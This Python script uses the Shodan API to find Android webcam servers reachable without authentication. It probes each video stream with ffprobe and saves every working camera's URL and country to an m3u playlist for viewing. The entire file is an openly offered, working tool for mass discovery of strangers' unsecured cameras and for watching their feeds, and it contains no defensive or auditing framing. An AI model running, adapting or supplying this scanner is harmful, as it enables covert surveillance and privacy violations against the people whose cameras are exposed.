#
# androidcam.py
# Search SHODAN for Android Webcam With No Auth
#
# Author: random_robbie

import shodan
import sys
import subprocess
import shlex
import json
import re
import os


# Configuration
API_KEY = "YOUR API KEY"
SEARCH_FOR = 'title:"Android Webcam Server"'

def test_cam (IP,CC,cam):
	
	print ("[*] Testing Cam: "+IP+" Country:"+CC+" [*]")
	cmd = "ffprobe -v quiet -print_format json -show_streams"
	args = shlex.split(cmd)
	args.append(cam)
    # run the ffprobe process, decode stdout into utf-8 & convert to JSON
	try:
		ffprobeOutput = subprocess.check_output(args,timeout=25).decode('utf-8')
		ffprobeOutput = json.loads(ffprobeOutput)
		# for example, find height and width
		height = ffprobeOutput['streams'][0]['height']
		width = ffprobeOutput['streams'][0]['width']
		print ("[*] Working Cam: "+IP+" Country:"+CC+" Resolution "+str(width)+" X "+str(height)+" [*]\n")
		text_file = open("cams.m3u", "a")
		text_file.write("#EXTINF:-0, Android Cam - "+IP+" - "+CC+"\n")
		text_file.write(""+cam+"\n")
		text_file.close()
		return True
	except subprocess.TimeoutExpired:
		print ("[*] Failed to connect to Cam: "+cam+" [*]\n")
		return False
	except:
		print ("[*] Failed to connect to Cam: "+cam+" [*]\n")
		return False
		


	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR, limit=500)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				CC = service['location']['country_name']
				PORT = service['port']
				port = str(PORT)
				cam = 'http://'+IP+':'+port+'/video'
				check1 = test_cam (IP,CC,cam)

except Exception as e:
		print (e)
		print('Error: %s' % e)
		sys.exit(1)